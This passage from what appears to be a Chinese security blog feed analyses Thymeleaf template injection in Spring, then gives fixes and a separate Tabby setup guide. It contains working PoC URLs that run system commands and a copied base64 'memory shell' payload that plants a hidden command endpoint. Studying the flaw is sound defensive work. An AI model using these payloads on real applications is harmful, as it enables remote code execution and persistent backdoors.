parameters. This is forbidden in order to reduce the possibilities that direct user input is executed as a part of the view name.<br></code></pre></td></tr></table></figure><p>这个错误信息表明在处理 Thymeleaf 模板时，视图名称包含了一个表达式，并且 URL 路径或请求参数中也包含了一个表达式。这种情况下，Thymeleaf 为了防止用户输入直接被执行为视图名称的一部分，禁止了这种情况。</p><p>那说明后面版本的修复是采用了禁止表达式的方式，然后看了一下具体的报错版本</p><p><img src="https://cdn.clown2024.cn/image-20241213230550190.png" alt="image-20241213230550190"></p><p>是thymeleaf-spring5-3.0.15.RELEASE.jar这个版本的jar包修复了，需要将spring-boot-starter-parent的版本降一下，降成2.4.1就行了，然后这时候thymeleaf-spring的版本是3.0.11的版本</p><p><img src="https://cdn.clown2024.cn/image-20241213230754543.png" alt="image-20241213230754543"></p><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>关键在前面我们没分析的renderFragment函数的渲染过程里面</p><p><img src="https://cdn.clown2024.cn/image-20241213231629083.png" alt="image-20241213231629083"></p><p>首先如上图，我们得viewTemplateName经过拼接之后的值现在是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">user/__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;).getInputStream()).next()&#125;__::/welcome<br></code></pre></td></tr></table></figure><p>然后他会判断里面是否有::字符串，这代表其是一个片段表达式</p><p>然后继续往下</p><p><img src="https://cdn.clown2024.cn/image-20241213231941833.png" alt="image-20241213231941833"></p><p>会获取一个表达式解析器，然后解析表达式，且将我们的viewTemplateName用~{和}包裹起来</p><p>然后触发的过程就在parseExpression方法里面，一直往后走会走到StandardExpressionPreprocessor#preprocess方法内</p><p><img src="https://cdn.clown2024.cn/image-20241213233227916.png" alt="image-20241213233227916"></p><p>这里有一个正则提取内容的匹配器</p><p><img src="https://cdn.clown2024.cn/image-20241213233851249.png" alt="image-20241213233851249"></p><p>其正则匹配格式如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">\_\_(.*?)\_\_<br></code></pre></td></tr></table></figure><p>代表其匹配__…__之间的内容，也就是可以将我们里面的表达式内容分割出来了，继续往下看</p><p><img src="https://cdn.clown2024.cn/image-20241213234249011.png" alt="image-20241213234249011"></p><p>最终是将我们的表达式分割出来，获得了一个VariableExpression，然后执行其execute函数执行表达式</p><p>然后层层调用最终通过SPEL来执行表达式内容</p><p><img src="https://cdn.clown2024.cn/image-20241213234528330.png" alt="image-20241213234528330"></p><p>所以该漏洞实际上就是SPEL表达式执行</p><p>所以根据前面的分析我们可以知道可以不需要.x，但是下面的漏洞形式一定需要.x</p><h2 id="uri-path"><a href="#URI-PATH" class="headerlink" title="URI PATH"></a>URI PATH</h2><p>漏洞代码</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getDocument</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String document)</span> &#123;<br>    log.info(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);<br>    <span class="hljs-comment">//returns void, so view name is taken from URI</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里漏洞原理总结起来就是因为ModelAndView返回值为空，所以viewTemplateName会从uri中获取，直接在<code>&#123;document&#125;</code>位置传入payload即可</p><p>poc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241213235751753.png" alt="image-20241213235751753"></p><h3 id="流程分析"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h3><p>来具体看一下为什么没有返回也会赋值的原因，原因主要在<code>DispatcherServlet#doDispatch</code>中，获取<code>ModleAndView</code>后还会执行<code>applyDefaultViewName</code>方法。</p><p><img src="https://cdn.clown2024.cn/image-20241214000125870.png" alt="image-20241214000125870"></p><p>可以看到此时的mv里面都为空，然后会执行一个applyDefaultViewName方法</p><p><img src="https://cdn.clown2024.cn/image-20241214000313196.png" alt="image-20241214000313196"></p><p>里面会从request对象里面获取一个默认的ViewName，获取到的defaultViewName就是我们的路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">doc/lang=__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;).getInputStream()).next()&#125;__::<br></code></pre></td></tr></table></figure><p>然后就把viewname设置为了我们默认的这个ViewName</p><p>欸然后这里发现，get回来的ViewName已经把我们的.x去掉了，这是怎么回事呢，进去具体看看都发生了什么</p><p>具体是里面的一个transformPath函数，对路由进行了格式转化</p><p><img src="https://cdn.clown2024.cn/image-20241214001608987.png" alt="image-20241214001608987"></p><p>首先前面两部分是去掉了前后的&#x2F;，然后调用StringUtils.stripFilenameExtension方法</p><p><img src="https://cdn.clown2024.cn/image-20241214001912868.png" alt="image-20241214001912868"></p><p>里面分别获取了最后一个.的索引和最后一个&#x2F;的索引，然后截取到最后一个.索引的内容</p><p>到这里就明白我们最后为什么要加一个.x了吧，因为需要保证我们前面的payload是完整的，所以得在最后加一个.，其实经过分析在最后加个.就可以了，不用.x</p><p>后面的流程就和前面一样了，就不分析了</p><blockquote><p>注意这个只适合无返回值的时候，不然view就会被返回值给占了</p></blockquote><h2 id="回显问题"><a href="#回显问题" class="headerlink" title="回显问题"></a>回显问题</h2><p>看文章他们的回显内容显示在了前端的报错信息内部，像这样</p><p><img src="https://cdn.clown2024.cn/image-20241214003633723.png" alt="image-20241214003633723"></p><p>而我的没有，他在后台的控制台的报错内容倒是有没绷住</p><p><img src="https://cdn.clown2024.cn/image-20241214003725080.png" alt="image-20241214003725080"></p><p>然后有回显的poc需要::后面是有内容的，大致原因主要是在<code>StandardExpressionParser#parseExpression</code>,在<code>preprocess</code>预处理结束后还会通过<code>Expression.parse</code>进行一次解析，这里如果解析失败则不会回显，这里就不分析了</p><p>poc在::后面随便加点内容就可以了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::aa.<br></code></pre></td></tr></table></figure><p>至于我前段为什么没回显我就不想纠结了，不如直接打内存马来的方便，有关spel表达式注入的学习放下一篇文章了。</p><h2 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h2><p>这里直接copy文章的一个内存马payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/__$&#123;T (org.springframework.cglib.core.ReflectUtils).defineClass(&quot;SpringRequestMappingMemshell&quot;,T (org.springframework.util.Base64Utils).decodeFromUrlSafeString(&quot;yv66vgAAADQAoQoACQBRCABSCgBTAFQIAFUKAFMAVgoACQBXCAAzBwBYBwBZBwBaCgAIAFsKAAoAXAcAXQgANQcAXgoACABfBwBgCABhCgARAGIHAGMHAGQKABQAZQcAZgoAFwBnCgANAFEKAAoAaAgAaQcAagoAHABrCABsCQBtAG4KAG8AcAcAcQoAcgBzCgAhAHQIAHUKACEAdgoAIQB3BwB4CQB5AHoKACcAewEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTFNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGw7AQAIZG9JbmplY3QBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwEAD3JlZ2lzdGVyTWFwcGluZwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZXhlY3V0ZUNvbW1hbmQBABhwYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BAEhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjsBABdtZXRob2RzUmVxdWVzdENvbmRpdGlvbgEATkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uOwEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABxyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nAQASTGphdmEvbGFuZy9PYmplY3Q7AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAWQcAXgcAagEAEE1ldGhvZFBhcmFtZXRlcnMBAD0oTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7AQADY21kAQAKZXhlY1Jlc3VsdAEACkV4Y2VwdGlvbnMHAHwBACJSdW50aW1lVmlzaWJsZVBhcmFtZXRlckFubm90YXRpb25zAQA2TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0UGFyYW07AQAFdmFsdWUBAApTb3VyY2VGaWxlAQAhU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbC5qYXZhDAAqACsBAAxpbmplY3Qtc3RhcnQHAH0MAH4AfwEACGNhbGMuZXhlDACAAIEMAIIAgwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QMAIQAhQwAhgCHAQAcU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbAEAEGphdmEvbGFuZy9TdHJpbmcMAIgAhQEARm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BAAIvKgwAKgCJAQBMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kDAAqAIoBAD1vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvDAAqAIsMAIwAjQEADmluamVjdC1zdWNjZXNzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAjgArAQAMaW5qZWN0LWVycm9yBwCPDACQAJEHAJIMAJMAlAEAEWphdmEvdXRpbC9TY2FubmVyBwCVDACWAJcMACoAmAEAAlxBDACZAJoMAJsAnAEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcAnQwAngCfDAAqAKABABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAEWdldERlY2xhcmVkTWV0aG9kAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAOyhbTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kOylWAQH2KExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGFyYW1zUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL0hlYWRlcnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUHJvZHVjZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdENvbmRpdGlvbjspVgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAFcHJpbnQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBACNvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1cwEAAk9LAQAlTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOwEAOihMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7KVYAIQANAAkAAAAAAAMAAQAqACsAAQAsAAAALwABAAEAAAAFKrcAAbEAAAACAC0AAAAGAAEAAAAMAC4AAAAMAAEAAAAFAC8AMAAAAAkAMQAyAAIALAAAAXEACQAHAAAApBICTLgAAxIEtgAFVyq2AAYSBwa9AAhZAxIJU1kEEglTWQUSClO2AAtNLAS2AAwSDRIOBL0ACFkDEg9TtgAQTrsAEVkEvQAPWQMSElO3ABM6BLsAFFkDvQAVtwAWOgW7ABdZGQQZBQEBAQEBtwAYOgYsKga9AAlZAxkGU1kEuwANWbcAGVNZBS1TtgAaVxIbTKcAEk0stgAdEh5MsgAfLLYAICuwAAEAAwCQAJMAHAADAC0AAABCABAAAAAOAAMAEAAMABEAKQASAC4AEwA_ABQAUQAVAF4AFgBwABcAjQAYAJAAHQCTABkAlAAaAJgAGwCbABwAogAeAC4AAABSAAgAKQBnADMANAACAD8AUQA1ADQAAwBRAD8ANgA3AAQAXgAyADgAOQAFAHAAIAA6ADsABgCUAA4APAA9AAIAAACkAD4APwAAAAMAoQBAAEEAAQBCAAAAEwAC_wCTAAIHAEMHAEQAAQcARQ4ARgAAAAUBAD4AAAABADUARwAEACwAAABoAAQAAwAAACa7ACFZuAADK7YABbYAIrcAIxIktgAltgAmTbsAJ1kssgAotwApsAAAAAIALQAAAAoAAgAAACMAGgAkAC4AAAAgAAMAAAAmAC8AMAAAAAAAJgBIAEEAAQAaAAwASQBBAAIASgAAAAQAAQBLAEYAAAAFAQBIAAAATAAAAAwBAAEATQABAE5zAEgAAQBPAAAAAgBQ&quot;),nEw javax.management.loading.MLet(NeW java.net.URL(&quot;http&quot;,&quot;127.0.0.1&quot;,&quot;1.txt&quot;),T (java.lang.Thread).currentThread().getContextClassLoader())).doInject(T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;,0).getBean(T (Class).forName(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;)))&#125;__::main.x<br></code></pre></td></tr></table></figure><p>然后访问 <code>/asd?cmd=whoami</code> 。</p><h2 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势"></a>其他姿势</h2><p>${…}改成*{…}也是可以的</p><p><strong>省略__</strong></p><p>当Controller如下配置时，可以省略<code>__</code>包裹，因为我们不需要特意去分割字符串了</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/path&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">path2</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>    <span class="hljs-keyword">return</span> lang; <span class="hljs-comment">//template path is tainted</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><ol><li><p>配置 <code>@ResponseBody</code> 或者 <code>@RestController</code>，这两个注解一开始也提到过，他们会将返回值会自动作为HTTP响应的正文返回，这意味着返回值不会被视图解析器处理，而是直接写入HTTP响应体中。</p></li><li><p>在返回值前面加上 “redirect:”</p><p>这样不再由 Spring ThymeleafView来进行解析，而是由 RedirectView 来进行解析。</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/safe/redirect&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">redirect</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String url)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + url; <span class="hljs-comment">//FP as redirects are not resolved as expressions</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在方法参数中加上 HttpServletResponse 参数</p><p>由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析。</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/safe/doc/&#123;document&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getDocument</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String document, HttpServletResponse response)</span> &#123;<br>    log.info(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>不过这些修复都比较临时，还是升级到新版本比较好</p><p>就先看这么多吧，新版本还有点东西有点懒了不想写了，之后遇到再学，毕竟实战感觉这种ssti并不会很多🥲</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/10514?time__1311=CqjxRD0iiteiqGNeeeuDQwqxfOj6eHDBWoD">https://xz.aliyun.com/t/10514?time__1311=CqjxRD0iiteiqGNeeeuDQwqxfOj6eHDBWoD</a></p><p><a href="https://www.anquanke.com/post/id/254519">https://www.anquanke.com/post/id/254519</a></p><p><a href="https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.html">https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近实在是不知道看什么了，来学一下和java相关的一些ssti吧，先从thymeleaf开始&lt;/p&gt;
&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;Thymeleaf就是一个模板渲</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="ssti" scheme="https://clowsman.github.io/tags/ssti/"/>
    
  </entry>
  
  <entry>
    <title>Tabby使用学习</title>
    <link href="https://clowsman.github.io/2024/12/01/Tabby%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/12/01/Tabby%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-11-30T17:16:29.000Z</published>
    <updated>2024-12-01T06:08:16.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>跟着官方环境来，但是具体上又有点出入，所以记录一下详细步骤，官方文档：<a href="https://www.yuque.com/wh1t3p1g/tp0c1t/rmm0aimycci76ysm">https://www.yuque.com/wh1t3p1g/tp0c1t/rmm0aimycci76ysm</a></p><p>首先官网下载tabby的zip文件：<a href="https://github.com/wh1t3p1g/tabby/releases/%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E9%9C%80%E8%A6%81%E7%9A%84%E4%B8%9C%E8%A5%BF%E9%83%BD%E5%8C%85%E5%90%AB%E4%BA%86">https://github.com/wh1t3p1g/tabby/releases/，里面所有需要的东西都包含了</a></p><h2 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h2><p>这一步比较重要，文档里面要的apoc插件和tabby-path-finder插件都包含在官方的zip里面了</p><p>然后新建一个Neo4j项目来给tabby使用，同时创建一个DBMS</p><p><img src="https://cdn.clown2024.cn/image-20241201012220397.png" alt="image-20241201012220397"></p><p>里面有一个默认的neo4j数据库，用这个就好了</p><p>然后配置tabby的数据库账号密码，tabby &gt;&#x3D; 1.3.x 版本的数据库配置放置于 <code>config/db.properties</code>，我这里没有这个文件，所以手动创建了一个文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># for docker<br>tabby.cache.isDockerImportPath            = false<br><br># db settings<br>tabby.neo4j.username                      = neo4j<br>tabby.neo4j.password                      = password<br>tabby.neo4j.url                           = bolt://127.0.0.1:7687<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241201012611132.png" alt="image-20241201012611132"></p><p>然后配置一下我们刚新建的数据库</p><p>点这里进去</p><p><img src="https://cdn.clown2024.cn/image-20241201012904191.png" alt="image-20241201012904191"></p><p><img src="https://cdn.clown2024.cn/image-20241201012920619.png" alt="image-20241201012920619"></p><p>然后找到对应的配置项，修改下面这些内容，没有就自己创建</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># 注释下面的配置，允许从本地任意位置载入csv文件<br>#server.directories.import=import<br><br># 允许 apoc 扩展<br>dbms.security.procedures.unrestricted=jwt.security.*,apoc.*<br><br># 修改内存相关配置 <br># 可以通过官方的neo4j-admin来推荐配置内存大小，https://neo4j.com/docs/operations-manual/current/tools/neo4j-admin/neo4j-admin-memrec/<br>dbms.memory.heap.initial_size=1G<br>dbms.memory.heap.max_size=4G<br>dbms.memory.pagecache.size=4G<br></code></pre></td></tr></table></figure><p>然后就是配置apoc，先找到配置文件的目录</p><p>点击这里会直接打开当前项目的配置文件目录</p><p><img src="https://cdn.clown2024.cn/image-20241201013409500.png" alt="image-20241201013409500"></p><p><img src="https://cdn.clown2024.cn/image-20241201013343735.png" alt="image-20241201013343735"></p><p>新建apoc.conf文件，配置下面内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">apoc.import.file.enabled=true<br>apoc.import.file.use_neo4j_config=false<br></code></pre></td></tr></table></figure><p>最后配置一下 apoc 和 tabby-path-finder 插件，打开 plugins 目录将对应的 jar 复制到该目录</p><p><img src="https://cdn.clown2024.cn/image-20241201013423656.png" alt="image-20241201013423656"></p><p>这里下载的两个插件版本有讲究，一开始漏看了，导致插件加载完数据库都起不来</p><blockquote><p>关于 apoc 插件的版本选择方法：Neo4j 数据库版本的前两位对应 apoc 插件的版本<br>比如 我Neo4j 数据库版本为 v5.24.0，则选择 apoc 插件 v5.2.x 版本</p></blockquote><p>我这里就选了两个5.24的</p><p><img src="https://cdn.clown2024.cn/image-20241201020830325.png" alt="image-20241201020830325"></p><p>上述步骤完成之后重启数据库</p><p>输入下面两个指令检查是否配置成功</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs cypher">CALL apoc.help(&#x27;all&#x27;)<br>CALL tabby.help(&#x27;tabby&#x27;)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241201020937163.png" alt="image-20241201020937163"></p><p>然后就是配置图数据库索引，这个是为了加快导入&#x2F;删除的速度，提前对节点进行索引建立</p><p>执行下面的cypher语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs cypher">CREATE CONSTRAINT c1 IF NOT EXISTS FOR (c:Class) REQUIRE c.ID IS UNIQUE;<br>CREATE CONSTRAINT c2 IF NOT EXISTS FOR (c:Class) REQUIRE c.NAME IS UNIQUE;<br>CREATE CONSTRAINT c3 IF NOT EXISTS FOR (m:Method) REQUIRE m.ID IS UNIQUE;<br>CREATE CONSTRAINT c4 IF NOT EXISTS FOR (m:Method) REQUIRE m.SIGNATURE IS UNIQUE;<br>CREATE INDEX index1 IF NOT EXISTS FOR (m:Method) ON (m.NAME);<br>CREATE INDEX index2 IF NOT EXISTS FOR (m:Method) ON (m.CLASSNAME);<br>CREATE INDEX index3 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.CLASSNAME);<br>CREATE INDEX index4 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.NAME0);<br>CREATE INDEX index5 IF NOT EXISTS FOR (m:Method) ON (m.SIGNATURE);<br>CREATE INDEX index6 IF NOT EXISTS FOR (m:Method) ON (m.NAME0);<br>CREATE INDEX index7 IF NOT EXISTS FOR (m:Method) ON (m.NAME0, m.CLASSNAME);<br>:schema //查看表库<br>:sysinfo //查看数据库信息<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241201021159909.png" alt="image-20241201021159909"></p><p><img src="https://cdn.clown2024.cn/image-20241201021255464.png" alt="image-20241201021255464"></p><p>这是删除所有约束的语句，有需要可以使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs cypher">DROP CONSTRAINT c1;<br>DROP CONSTRAINT c2;<br>DROP CONSTRAINT c3;<br>DROP CONSTRAINT c4;<br>DROP INDEX index1;<br>DROP INDEX index2;<br>DROP INDEX index3;<br>DROP INDEX index4;<br>DROP INDEX index5;<br>DROP INDEX index6;<br>DROP INDEX index7;<br></code></pre></td></tr></table></figure><h2 id="idea插件安装"><a href="#idea插件安装" class="headerlink" title="idea插件安装"></a>idea插件安装</h2><p>该插件是用来加速我们的分析过程的，通常一次完整的tabby使用流程为下面几步：</p><ol><li>生成代码属性图</li><li>导入图数据库neo4j</li><li>使用browser查询指定cypher语句</li><li>复制对应的classname等信息后在IDEA定位到对应代码进行人工确认</li></ol><p>我们需要手动下载安装插件，插件地址：<a href="https://github.com/wh1t3p1g/tabby-intellij-plugin">https://github.com/wh1t3p1g/tabby-intellij-plugin</a></p><p>下载好是一个zip文件，然后去idea的插件市场选择从磁盘安装插件</p><p><img src="https://cdn.clown2024.cn/image-20241201021913952.png" alt="image-20241201021913952"></p><p>直接选择我们的zip文件，下载好后可以在已安装插件中看到</p><p><img src="https://cdn.clown2024.cn/image-20241201022205930.png" alt="image-20241201022205930"></p><p>然后配置对应的数据源</p><p><img src="https://cdn.clown2024.cn/image-20241201022319862.png" alt="image-20241201022319862"></p><h1 id="运行示例"><a href="#运行示例" class="headerlink" title="运行示例"></a>运行示例</h1><p>这里在case目录里面放了一个cc3.2.1的依赖</p><p>然后下面命令开始分析生成数据</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">java -Xmx4g -jar tabby.jar<br></code></pre></td></tr></table></figure><p>然后就会在output目录下生成一系列csv文件</p><p><img src="https://cdn.clown2024.cn/image-20241201140610659.png" alt="image-20241201140610659"></p><p>高版本需要使用tabby-vul-finder来手动导入生成的结果到图数据库中，文件地址：<a href="https://github.com/wh1t3p1g/tabby-vul-finder">https://github.com/wh1t3p1g/tabby-vul-finder</a></p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">java -jar tabby-vul-finder.jar load D:\CTF\Java\工具\tabby\output\dev<br></code></pre></td></tr></table></figure><p>这样即可完成导入</p><p><img src="https://cdn.clown2024.cn/image-20241201140654291.png" alt="image-20241201140654291"></p><p>属性图的介绍在官方文档里有说明：<a href="https://www.yuque.com/wh1t3p1g/tp0c1t/pppuq72tfhmic3g4">https://www.yuque.com/wh1t3p1g/tp0c1t/pppuq72tfhmic3g4</a></p>]]></content>
    
    
      
      
